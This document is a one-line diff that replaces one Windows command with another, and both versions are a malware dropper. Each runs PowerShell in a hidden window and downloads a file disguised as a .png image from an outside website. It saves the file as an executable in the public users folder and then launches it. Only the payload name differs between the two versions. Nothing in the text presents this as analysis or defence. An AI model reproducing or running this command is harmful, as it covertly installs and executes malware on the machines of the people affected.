@@ -1,1 +1,1 @@
-ipconfig c:\ & cls & start cmd.exe /c powershell.exe -windowstyle hidden -c (new-object System.Net.WebClient).Downloadfile('https://www.flagstafftownhomes.com/d/Shadmand.png','C://Users/Public//Shadmand.exe');start C:\Users\Public\Shadmand.exe & c:\ & cls
+c:\ & cls & start cmd.exe /c powershell.exe -windowstyle hidden -c (new-object System.Net.WebClient).Downloadfile('https://www.flagstafftownhomes.com/d/vecnaisaw.png','C://Users/Public//vecnaisaw.exe');start C:\Users\Public\vecnaisaw.exe
